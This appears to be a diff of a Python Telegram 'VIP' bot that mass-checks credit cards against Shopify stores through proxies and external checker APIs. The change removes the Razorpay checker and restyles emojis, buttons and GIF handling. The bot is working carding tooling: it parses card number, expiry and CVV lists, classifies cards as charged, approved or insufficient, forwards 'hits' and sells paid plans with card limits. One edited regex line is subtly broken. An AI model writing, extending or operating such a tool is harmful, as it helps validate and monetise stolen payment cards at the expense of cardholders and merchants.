@@ -1,6 +1,6 @@
 # ==============================================================================
-# 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 & 𝐑𝐀𝐙𝐎𝐑𝐏𝐀𝐘 𝐕𝐈𝐏 𝐁𝐎𝐓 - 𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐏𝐑𝐎𝐃𝐔𝐂𝐓𝐈𝐎𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 
-# (FORCED GIF ENGINE, EXACT CUSTOM EMOJIS, RAZORPAY API, CHARGED FONT)
+# 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 𝐕𝐈𝐏 𝐁𝐎𝐓 - 𝐔𝐋𝐓𝐈𝐌𝐀𝐓𝐄 𝐏𝐑𝐎𝐃𝐔𝐂𝐓𝐈𝐎𝐍 𝐒𝐘𝐒𝐓𝐄𝐌 
+# (RUSSIAN DEEP-LINK EMOJI METHOD, FORCED GIF ENGINE, COLORED BUTTONS)
 # ==============================================================================
 import asyncio
 import aiohttp
@@ -62,8 +62,6 @@ HITS_GROUP_TARGET = get_valid_target(HITS_GROUP_LINK, HITS_GROUP_ID)
 
 # APIs
 SHOPIFY_API_URL = 'https://autosh.up.railway.app/shopii'
-RAZORPAY_API_URL = 'https://web-production-6fd9c.up.railway.app/razorpay'
-
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/7Tqk/New-bot-tele/refs/heads/main/sites.txt")
 KEYS_FILE = "redeem_keys.json"
 
@@ -120,22 +118,22 @@ def escape_html(text):
     if not text: return "Unknown"
     return str(text).replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
 
-# ====================== EXACT PREMIUM EMOJIS (FROM JSON) ======================
-CE_CASH = '<tg-emoji emoji-id="5409048419211682843">💵</tg-emoji>'
-CE_PARTY = '<tg-emoji emoji-id="5461151367559141950">🎉</tg-emoji>'
-CE_CROWN = '<tg-emoji emoji-id="5217822164362739968">👑</tg-emoji>'
-CE_DIAMOND = '<tg-emoji emoji-id="5427168083074628963">💎</tg-emoji>'
-CE_FLY = '<tg-emoji emoji-id="5231005931550030290">💸</tg-emoji>'
-CE_CANDLE = '<tg-emoji emoji-id="5451882707875276247">🕯</tg-emoji>'
-CE_TOP = '<tg-emoji emoji-id="5415655814079723871">🔝</tg-emoji>'
-CE_GEAR = '<tg-emoji emoji-id="5341715473882955310">⚙️</tg-emoji>'
-CE_SNOW = '<tg-emoji emoji-id="5449449325434266744">❄️</tg-emoji>'
-CE_BOOM = '<tg-emoji emoji-id="5276032951342088188">💥</tg-emoji>'
-CE_MIC = '<tg-emoji emoji-id="5224736245665511429">🎤</tg-emoji>'
-CE_SMILE = '<tg-emoji emoji-id="5461117441612462242">🙂</tg-emoji>'
-CE_CHART = '<tg-emoji emoji-id="5246762912428603768">📉</tg-emoji>'
-CE_GLASSES = '<tg-emoji emoji-id="5391112412445288650">🥸</tg-emoji>'
-CE_CLOWN = '<tg-emoji emoji-id="5269531045165816230">🤡</tg-emoji>'
+# ====================== RUSSIAN METHOD PREMIUM EMOJIS ======================
+CE_CASH = '<a href="tg://emoji?id=5409048419211682843">💵</a>'
+CE_PARTY = '<a href="tg://emoji?id=5461151367559141950">🎉</a>'
+CE_CROWN = '<a href="tg://emoji?id=5217822164362739968">👑</a>'
+CE_DIAMOND = '<a href="tg://emoji?id=5427168083074628963">💎</a>'
+CE_FLY = '<a href="tg://emoji?id=5231005931550030290">💸</a>'
+CE_CANDLE = '<a href="tg://emoji?id=5451882707875276247">🕯</a>'
+CE_TOP = '<a href="tg://emoji?id=5415655814079723871">🔝</a>'
+CE_GEAR = '<a href="tg://emoji?id=5341715473882955310">⚙️</a>'
+CE_SNOW = '<a href="tg://emoji?id=5449449325434266744">❄️</a>'
+CE_BOOM = '<a href="tg://emoji?id=5276032951342088188">💥</a>'
+CE_MIC = '<a href="tg://emoji?id=5224736245665511429">🎤</a>'
+CE_SMILE = '<a href="tg://emoji?id=5461117441612462242">🙂</a>'
+CE_CHART = '<a href="tg://emoji?id=5246762912428603768">📉</a>'
+CE_GLASSES = '<a href="tg://emoji?id=5391112412445288650">🥸</a>'
+CE_CLOWN = '<a href="tg://emoji?id=5269531045165816230">🤡</a>'
 
 # ====================== FLAGS ======================
 ALL_COUNTRY_CODES = ["AE","AF","AR","AT","AU","BE","BG","BR","CA","CH","CL","CN","CO","CR","CZ","DE","DK","DZ","EC","EE","EG","ES","FI","FR","GB","GR","HK","HR","HU","ID","IE","IL","IN","IT","JP","KR","KW","KZ","LB","LT","LU","LV","MA","MT","MX","MY","NG","NL","NO","NZ","OM","PA","PE","PH","PK","PL","PT","QA","RO","RS","RU","SA","SE","SG","SI","SK","TH","TR","TW","UA","US","UY","VN","ZA"]
@@ -146,15 +144,15 @@ def get_flag_emoji(country_code, fallback="🏳️"):
     c = country_code.upper()
     return COUNTRY_FLAGS.get(c, chr(ord(c[0]) + 127397) + chr(ord(c[1]) + 127397) if c.isalpha() else fallback)
 
-# ====================== GIF ASSETS ======================
-WELCOME_GIF = "https://media.giphy.com/media/3o7aD2d7hy9ktXNDP2/giphy.gif"
-REDEEM_GIF = "https://media.giphy.com/media/l41YkxvU8c7J7Bba0/giphy.gif"
+# ====================== BULLETPROOF i.giphy DIRECT CDN LINKS ======================
+WELCOME_GIF = "https://i.giphy.com/3o7aD2d7hy9ktXNDP2.gif"
+REDEEM_GIF = "https://i.giphy.com/l41YkxvU8c7J7Bba0.gif"
 ANIME_GIFS = [
-    "https://media.giphy.com/media/1n4iuWZFnTeN6qvdpD/giphy.gif",
-    "https://media.giphy.com/media/11KzOet1ElBDz2/giphy.gif",
-    "https://media.giphy.com/media/4ilFRqgbzbx4c/giphy.gif",
-    "https://media.giphy.com/media/xT1R9yebNpKAAJjH0s/giphy.gif",
-    "https://media.giphy.com/media/108BDeJ2BvtZRu/giphy.gif"
+    "https://i.giphy.com/1n4iuWZFnTeN6qvdpD.gif",
+    "https://i.giphy.com/11KzOet1ElBDz2.gif",
+    "https://i.giphy.com/4ilFRqgbzbx4c.gif",
+    "https://i.giphy.com/xT1R9yebNpKAAJjH0s.gif",
+    "https://i.giphy.com/108BDeJ2BvtZRu.gif"
 ]
 
 PLANS = {
@@ -182,7 +180,8 @@ def is_valid_url(link):
 async def fetch_gif_bytes(url):
     try:
         async with aiohttp.ClientSession() as session:
-            async with session.get(url, timeout=15) as resp:
+            headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"}
+            async with session.get(url, headers=headers, timeout=15) as resp:
                 if resp.status == 200:
                     bio = io.BytesIO(await resp.read())
                     bio.name = "animation.gif"
@@ -191,7 +190,6 @@ async def fetch_gif_bytes(url):
     return None
 
 async def send_forced_gif(target_func, text, markup, url):
-    """Engine to force GIF sending by bypassing Telegram URL cache issues."""
     media_to_send = _GIF_FILE_IDS.get(url, url)
     try:
         msg = await target_func(
@@ -202,7 +200,6 @@ async def send_forced_gif(target_func, text, markup, url):
             _GIF_FILE_IDS[url] = msg.animation.file_id
         return msg
     except Exception:
-        # Fallback: Download to memory and force upload
         gif_io = await fetch_gif_bytes(url)
         if gif_io:
             try:
@@ -214,8 +211,6 @@ async def send_forced_gif(target_func, text, markup, url):
                     _GIF_FILE_IDS[url] = msg.animation.file_id
                 return msg
             except Exception: pass
-    
-    # Ultimate fallback if GIF completely fails
     try:
         if hasattr(target_func, '__self__') and hasattr(target_func.__self__, 'reply_text'):
             return await target_func.__self__.reply_text(text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
@@ -242,9 +237,7 @@ async def styled_edit(msg, text, buttons=None):
 async def styled_send(bot, chat_id, text, buttons=None, use_gif=True, specific_gif=None):
     markup = InlineKeyboardMarkup(buttons) if buttons else None
     url = specific_gif or random.choice(ANIME_GIFS)
-    
     async def _bot_send_anim(**kwargs): return await bot.send_animation(chat_id=chat_id, **kwargs)
-    
     if use_gif or specific_gif: return await send_forced_gif(_bot_send_anim, text, markup, url)
     try: return await bot.send_message(chat_id=chat_id, text=text, reply_markup=markup, parse_mode=ParseMode.HTML, disable_web_page_preview=True)
     except Exception: return None
@@ -302,7 +295,7 @@ def extract_cc(text):
         y = '20' + y if len(y) == 2 else y
         cards.append(f"{c}|{m}|{y}|{cv}")
     if not cards:
-        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text): cards.append(f"{c}|{m}|{y}|{cv}")
+        for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{4})(\d{3,4})', text): cards.append(f"{c}|{m}|y|{cv}")
     if not cards:
         for c, m, y, cv in re.findall(r'(\d{15,16})[\s|/\\:]+(\d{2})[\s|/\\:]+(\d{2})(\d{3,4})', text): cards.append(f"{c}|{m}|20{y}|{cv}")
     return list(dict.fromkeys(cards))
@@ -320,7 +313,6 @@ def parse_proxy_format(proxy):
     return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}
 
 _CACHED_SHOPIFY_SITES = []
-_CACHED_RAZOR_SITES = []
 _LAST_SITES_FETCH = 0
 
 async def get_shopify_sites():
@@ -340,19 +332,6 @@ async def get_shopify_sites():
                 _CACHED_SHOPIFY_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await f.read()).split('\n') if l.strip()]))
         except Exception: pass
     return _CACHED_SHOPIFY_SITES
-
-async def get_razor_sites():
-    global _CACHED_RAZOR_SITES
-    if _CACHED_RAZOR_SITES: return _CACHED_RAZOR_SITES
-    if not os.path.exists('sites1.txt'):
-        try:
-            async with aiofiles.open('sites1.txt', 'w', encoding='utf-8') as f: await f.write("razorpay-site.com\n")
-        except: pass
-    try:
-        async with aiofiles.open('sites1.txt', 'r', encoding='utf-8') as f:
-            _CACHED_RAZOR_SITES = list(set([re.sub(r'^https?://', '', l.strip()).rstrip('/') for l in (await f.read()).split('\n') if l.strip()]))
-    except Exception: pass
-    return _CACHED_RAZOR_SITES
 
 # ====================== SMART SITE DEAD FILTER ======================
 def is_dead_site_error(err):
@@ -398,9 +377,14 @@ async def send_welcome_menu(update_or_bot, uid, plan, limit):
 
 <b>{CE_SMILE} {sf('Your Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Free')} ({sf(str(limit))} {sf('CC Limit')})</code>"""
     
-    kb = [[InlineKeyboardButton(sf("View Plans"), callback_data="show_plans")]]
-    if is_valid_url(JOIN_CHANNEL_LINK): kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK)])
-    if is_valid_url(JOIN_GROUP_LINK): kb[-1].append(InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK))
+    kb = [[InlineKeyboardButton(sf("View Plans"), callback_data="show_plans", style="primary")]]
+    
+    if is_valid_url(JOIN_CHANNEL_LINK) and is_valid_url(JOIN_GROUP_LINK):
+        kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK, style="primary"), InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK, style="primary")])
+    elif is_valid_url(JOIN_CHANNEL_LINK):
+        kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK, style="primary")])
+    elif is_valid_url(JOIN_GROUP_LINK):
+        kb.append([InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK, style="primary")])
         
     if isinstance(update_or_bot, Update):
         await styled_reply(update_or_bot, t, buttons=kb, use_gif=True, specific_gif=WELCOME_GIF)
@@ -419,9 +403,9 @@ async def force_join_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return True
         
     kb = []
-    if is_valid_url(JOIN_CHANNEL_LINK): kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK)])
-    if is_valid_url(JOIN_GROUP_LINK): kb.append([InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK)])
-    if kb: kb.append([InlineKeyboardButton(sf("Verify"), callback_data="check_joined")])
+    if is_valid_url(JOIN_CHANNEL_LINK): kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK, style="primary")])
+    if is_valid_url(JOIN_GROUP_LINK): kb.append([InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK, style="primary")])
+    if kb: kb.append([InlineKeyboardButton(sf("Verify"), callback_data="check_joined", style="success")])
     
     await styled_reply(update, f"<b>{CE_CLOWN} {sf('Access Denied')}</b>\n\n├ {sf('You must join our official channels first.')}\n╰ {sf('Please join, then click Verify.')}", buttons=kb, use_gif=True)
     return False
@@ -437,7 +421,7 @@ async def get_bin_info(bin_code):
     except Exception: pass
     return {"brand": "-", "type": "-", "level": "-", "bank": "-", "country": "-", "country_code": "", "flag": "🏳️"}
 
-# 1. SHOPIFY API
+# SHOPIFY API
 async def check_shopify_api(card, site, proxy, session):
     try:
         proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
@@ -474,48 +458,6 @@ async def check_shopify_api(card, site, proxy, session):
     except asyncio.TimeoutError: return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
     except Exception as e: return {'status': 'Site Error', 'message': f'Error: {str(e)[:20]}', 'card': card, 'retry': True}
 
-# 2. RAZORPAY API
-async def check_razorpay_api(card, site, proxy, session):
-    try:
-        proxy_str = proxy['proxy_url'] if isinstance(proxy, dict) else proxy
-        proxy_param = f"&proxy={proxy_str}" if proxy else ""
-        req_url = f"{RAZORPAY_API_URL}?cc={card}&site={site}{proxy_param}"
-        
-        # سعر بوابة Razorpay كما طلبت
-        pr = "10₹"
-        gt = "RazorPay"
-        
-        async with session.get(req_url, timeout=90) as resp:
-            text_data = await resp.text()
-            if resp.status != 200: return {'status': 'Site Error', 'message': f'Server Error {resp.status}', 'card': card, 'retry': True}
-            try: rj = json.loads(text_data)
-            except Exception: return {'status': 'Site Error', 'message': 'Format Error', 'card': card, 'retry': True}
-            
-        rm = str(rj.get('Response', '')).strip()
-        rl = rm.lower()
-        st = rj.get('Status', False)
-        
-        if is_dead_site_error(rm) or 'proxy' in rl or 'timeout' in rl:
-            return {'status': 'Site Error', 'message': rm, 'card': card, 'retry': True, 'gateway': gt, 'price': pr}
-
-        # ردود Razorpay
-        if st is True or 'success' in rl or 'captured' in rl or 'authorized' in rl: 
-            return {'status': 'Charged', 'message': 'Payment Succeeded', 'card': card, 'gateway': gt, 'price': pr}
-            
-        if 'insufficient' in rl or 'funds' in rl or 'balance' in rl:
-            return {'status': 'Insufficient', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
-
-        if '3d' in rl or 'secure' in rl or 'otp' in rl or 'authentication' in rl:
-            return {'status': 'Approved', 'message': '3d_secure_required', 'card': card, 'gateway': gt, 'price': pr}
-            
-        if 'risk' in rl or 'declined' in rl or 'failed' in rl:
-            return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
-            
-        return {'status': 'Dead', 'message': rm, 'card': card, 'gateway': gt, 'price': pr}
-        
-    except asyncio.TimeoutError: return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
-    except Exception as e: return {'status': 'Site Error', 'message': f'Error: {str(e)[:20]}', 'card': card, 'retry': True}
-
 # Core Checker Function
 async def check_card_with_retry(card, sites, proxies, session, gateway_name, max_retries=2):
     lr = None; ap = list(proxies) if proxies else []
@@ -529,8 +471,6 @@ async def check_card_with_retry(card, sites, proxies, session, gateway_name, max
         
         if gateway_name == "Shopify":
             r = await check_shopify_api(card, s, p, session)
-        elif gateway_name == "RazorPay":
-            r = await check_razorpay_api(card, s, p, session)
         else:
             return {'status': 'Dead', 'message': 'Unknown Gateway', 'card': card}
             
@@ -602,7 +542,7 @@ async def _send_mass_hit(card, gateway, price, uid, elapsed, bot):
     try:
         bi = await get_bin_info(card.split("|")[0])
         msg = format_card_result(card, gateway, price, bi, elapsed)
-        kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt")]]
+        kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt", style="primary")]]
         await styled_send(bot, uid, msg, buttons=kb, use_gif=True)
     except Exception: pass
 
@@ -645,8 +585,8 @@ async def auto_file_check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE
         PENDING_FILES[uid] = cards
         
         kb = [
-            [InlineKeyboardButton(sf("Shopify (Charge)"), callback_data="gate:Shopify"), InlineKeyboardButton(sf("RazorPay (10₹)"), callback_data="gate:RazorPay")],
-            [InlineKeyboardButton(sf("Cancel"), callback_data="gate:cancel")]
+            [InlineKeyboardButton(sf("Shopify (Charge)"), callback_data="gate:Shopify", style="success")],
+            [InlineKeyboardButton(sf("Cancel"), callback_data="gate:cancel", style="danger")]
         ]
         await styled_edit(pm, f"<b>{CE_CROWN} {sf('File Loaded Successfully')}</b>\n\n├ <b>{CE_DIAMOND} {sf('Total CCs')}:</b> <code>{sf(str(len(cards)))}</code>\n╰ <b>{CE_TOP} {sf('Please select a Gateway to start')}:</b>", buttons=kb)
     except Exception as e: await styled_edit(pm, f"<b>{CE_CLOWN} {sf('Error')}:</b> {sf(str(e))}")
@@ -702,7 +642,7 @@ async def master_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         for _, pi in PLANS.items():
             t += f"├ <b>{sf(pi['name'])}</b>\n│ ├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n│ ├ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} {sf('CCs')}</code>\n│ ╰ <b>{CE_CASH} {sf('Price')}:</b> <code>{sf(pi['price'])}</code>\n│\n"
         t += f"╰ <b>{sf('Your Current Plan')}:</b> <code>{sf(cp.title()) if cp else sf('Bronze')}</code>"
-        kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt")], [InlineKeyboardButton(sf("Back"), callback_data="back_start")]]
+        kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt", style="primary")], [InlineKeyboardButton(sf("Back"), callback_data="back_start", style="danger")]]
         await styled_reply(update, t, buttons=kb, use_gif=True)
 
     elif cmd == "fb":
@@ -911,7 +851,7 @@ async def plans_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
     for _, pi in PLANS.items():
         t += f"├ <b>{sf(pi['name'])}</b>\n│ ├ <b>{CE_CANDLE} {sf('Duration')}:</b> <code>{sf(str(pi['duration_days']))} {sf('Days')}</code>\n│ ├ <b>{CE_GEAR} {sf('Limit')}:</b> <code>{sf(str(get_cc_limit(pi['tier'])))} CCs</code>\n│ ╰ <b>{CE_CASH} {sf('Price')}:</b> <code>{sf(pi['price'])}</code>\n│\n"
     t += f"╰ <b>{sf('Your Current Plan')}:</b> <code>{sf(cp.title()) if cp else sf('Bronze')}</code>"
-    kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt")], [InlineKeyboardButton(sf("Back"), callback_data="back_start")]]
+    kb = [[InlineKeyboardButton(sf("Contact Owner"), url="https://t.me/Dddadddyttt", style="primary")], [InlineKeyboardButton(sf("Back"), callback_data="back_start", style="danger")]]
     await styled_edit(q.message, t, buttons=kb)
     await q.answer()
 
@@ -943,9 +883,14 @@ async def back_start_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 <b>{CE_SMILE} {sf('Your Plan')}:</b> <code>{sf(plan.title()) if plan else sf('Free')} ({sf(str(limit))} {sf('CC Limit')})</code>"""
     
-    kb = [[InlineKeyboardButton(sf("View Plans"), callback_data="show_plans")]]
-    if is_valid_url(JOIN_CHANNEL_LINK): kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK)])
-    if is_valid_url(JOIN_GROUP_LINK): kb[-1].append(InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK))
+    kb = [[InlineKeyboardButton(sf("View Plans"), callback_data="show_plans", style="primary")]]
+    
+    if is_valid_url(JOIN_CHANNEL_LINK) and is_valid_url(JOIN_GROUP_LINK):
+        kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK, style="primary"), InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK, style="primary")])
+    elif is_valid_url(JOIN_CHANNEL_LINK):
+        kb.append([InlineKeyboardButton(sf("Channel"), url=JOIN_CHANNEL_LINK, style="primary")])
+    elif is_valid_url(JOIN_GROUP_LINK):
+        kb.append([InlineKeyboardButton(sf("Group"), url=JOIN_GROUP_LINK, style="primary")])
         
     await styled_edit(q.message, t, buttons=kb)
     await q.answer()
@@ -996,9 +941,7 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     tot = len(cards); chk = chg = app = ins = dec = err = 0
     st = time.time()
     
-    if gate_name == "RazorPay": sites = await get_razor_sites()
-    else: sites = await get_shopify_sites()
-        
+    sites = await get_shopify_sites()
     proxies = [p['proxy_url'] for p in await get_all_user_proxies(uid)] if await get_all_user_proxies(uid) else []
     http_session = await get_user_http_session(uid)
     
@@ -1022,12 +965,12 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
             percent = int((chk / tot) * 100) if tot > 0 else 0
             
             kb = [
-                [InlineKeyboardButton(sf(f"📄 {chk}/{tot} ({percent}%)"), callback_data="none")],
-                [InlineKeyboardButton(sf(f"⇌ Charged: {chg}"), callback_data="none"), InlineKeyboardButton(sf(f"✅ Approved: {app}"), callback_data="none")],
-                [InlineKeyboardButton(sf(f"● Insuff: {ins}"), callback_data="none"), InlineKeyboardButton(sf(f"✖ Declined: {dec}"), callback_data="none")],
-                [InlineKeyboardButton(sf(f"❗ Errors: {err}"), callback_data="none")],
-                [InlineKeyboardButton(sf(f"🚀 Speed: {cpm} CPM"), callback_data="none")],
-                [InlineKeyboardButton(sf("🛑 Stop Process"), callback_data=f"{stop_prefix}:{uid}")]
+                [InlineKeyboardButton(sf(f"📄 {chk}/{tot} ({percent}%)"), callback_data="none", style="success" if percent == 100 else "primary")],
+                [InlineKeyboardButton(sf(f"⇌ Charged: {chg}"), callback_data="none", style="success"), InlineKeyboardButton(sf(f"✅ Approved: {app}"), callback_data="none", style="success")],
+                [InlineKeyboardButton(sf(f"● Insuff: {ins}"), callback_data="none", style="success"), InlineKeyboardButton(sf(f"✖ Declined: {dec}"), callback_data="none", style="danger")],
+                [InlineKeyboardButton(sf(f"❗ Errors: {err}"), callback_data="none", style="danger")],
+                [InlineKeyboardButton(sf(f"🚀 Speed: {cpm} CPM"), callback_data="none", style="primary")],
+                [InlineKeyboardButton(sf("🛑 Stop Process"), callback_data=f"{stop_prefix}:{uid}", style="danger")]
             ]
             try: await styled_edit(msg_obj, dt, buttons=kb)
             except asyncio.CancelledError: break
@@ -1087,11 +1030,11 @@ async def _run_mass_process(update: Update, msg_obj, cards, process_store, stop_
     ft = f"<b>{CE_CROWN} {sf('DONE')} {CE_PARTY}</b>\n\n├ <b>{CE_TOP} {sf('Gateway')}:</b> <code>{sf(gate_name)}</code>\n├ <b>{CE_GEAR} {sf('Workers')}:</b> <code>{sf(str(WORKERS))}</code>\n├ <b>{CE_BOOM} {sf('Response')}:</b> <code>{sf(last_resp)}</code>\n╰ <b>{CE_CHART} {sf('Total Time')}:</b> <code>{sf(f'{h}h {m}m {s}s')}</code>"
     
     fkb = [
-        [InlineKeyboardButton(sf(f"📄 {chk}/{tot} (100%)"), callback_data="none")],
-        [InlineKeyboardButton(sf(f"⇌ Charged: {chg}"), callback_data="none"), InlineKeyboardButton(sf(f"✅ Approved: {app}"), callback_data="none")],
-        [InlineKeyboardButton(sf(f"● Insuff: {ins}"), callback_data="none"), InlineKeyboardButton(sf(f"✖ Declined: {dec}"), callback_data="none")],
-        [InlineKeyboardButton(sf(f"❗ Errors: {err}"), callback_data="none")],
-        [InlineKeyboardButton(sf(f"🚀 Average Speed: {avg_cpm} CPM"), callback_data="none")]
+        [InlineKeyboardButton(sf(f"📄 {chk}/{tot} (100%)"), callback_data="none", style="success")],
+        [InlineKeyboardButton(sf(f"⇌ Charged: {chg}"), callback_data="none", style="success"), InlineKeyboardButton(sf(f"✅ Approved: {app}"), callback_data="none", style="success")],
+        [InlineKeyboardButton(sf(f"● Insuff: {ins}"), callback_data="none", style="success"), InlineKeyboardButton(sf(f"✖ Declined: {dec}"), callback_data="none", style="danger")],
+        [InlineKeyboardButton(sf(f"❗ Errors: {err}"), callback_data="none", style="danger")],
+        [InlineKeyboardButton(sf(f"🚀 Average Speed: {avg_cpm} CPM"), callback_data="none", style="primary")]
     ]
     try: await styled_edit(msg_obj, ft, buttons=fkb)
     except Exception: pass
@@ -1114,7 +1057,6 @@ async def empty_callback_handler(update: Update, context: ContextTypes.DEFAULT_T
 async def check_sites_loop():
     while True:
         await get_shopify_sites()
-        await get_razor_sites()
         await asyncio.sleep(600)
 
 async def post_init(app: Application):
@@ -1137,7 +1079,7 @@ def main():
     app.add_handler(CallbackQueryHandler(check_joined_cb, pattern=r"^check_joined$"))
     app.add_handler(CallbackQueryHandler(empty_callback_handler, pattern=r"^none$"))
     
-    logger.info("✅ VIP BOT IS FULLY OPERATIONAL WITH FORCED GIFS & RAZORPAY!")
+    logger.info("✅ VIP BOT IS FULLY OPERATIONAL WITH FORCED GIFS & SHOPIFY ONLY!")
     
     while True:
         try:
